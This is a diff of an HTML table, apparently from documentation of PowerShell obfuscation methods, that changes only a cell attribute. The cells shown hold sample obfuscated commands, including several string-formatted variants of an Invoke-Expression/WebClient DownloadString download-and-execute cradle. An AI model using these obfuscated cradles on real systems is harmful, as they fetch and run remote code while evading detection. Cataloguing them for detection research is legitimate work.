@@ -157,7 +157,7 @@ you can copy the results from all cases for one or more obfuscation methods and 
  <tr>
   <td align="center">8</td>
   <td align="center">TOKEN\TYPE\2</td>
-  <td nowrap> 
+  <td> 
    <p>Set-itEM  vaRiAbLE:YsB  (  [tYPe]("{1}{3}{0}{2}"-f'C','SCrIP','K','tblO') ) ;   (  GET-vArIAblE  YSb  ).vAlUE::Create("Write-Host $env:path")</p>
    <p> set-ITEm ('VAri'+'aBL'+'E'+':Y'+'7w8o') ([typE]("{2}{0}{3}{1}"-f'c','LoCK','s','RIPTb')  ) ; ( geT-ChILditEM ('VARI'+'aBL'+'e'+':y'+'7w8O') ).vALue::Create("Write-Host $env:path")</p>
    <p>SEt-ItEM  ('vAriAb'+'l'+'e:p87z2')  ([TyPe]("{2}{0}{1}"-F 'tBl','OCK','ScriP') ) ; (  ItEM ('VaRiab'+'L'+'E:P87Z2')).vaLUe::Create("Write-Host $env:path")</p>
@@ -168,7 +168,7 @@ you can copy the results from all cases for one or more obfuscation methods and 
  <tr>
   <td align="center">9</td>
   <td align="center">TOKEN\ALL\1</td>
-  <td nowrap> 
+  <td> 
    <p>.("{0}{3}{1}{2}{4}{5}" -f 'Inv','Expre','s','oke-','si','on') (                      .("{2}{1}{0}" -f'ct','je','New-Ob') ("{2}{0}{1}"-f 'e','bClient','Net.W')               ).("{2}{0}{1}{3}" -f 'ownl','oad','D','String')</p>
    <p>.("{1}{0}{4}{3}{2}" -f'e-E','Invok','on','ressi','xp') (.("{1}{2}{0}" -f 'Object','New','-') ("{1}{2}{0}{3}"-f 'en','Net.WebC','li','t')).("{0}{3}{2}{4}{1}" -f'Do','ing','l','wn','oadStr')</p>
    <p>&("{0}{1}{3}{2}"-f'I','nvoke','ession','-Expr') (&("{1}{0}{2}"-f'Obj','New-','ect') ("{2}{0}{4}{1}{3}" -f 'Cl','en','Net.Web','t','i')).("{1}{2}{3}{0}" -f'g','DownloadSt','r','in')</p>
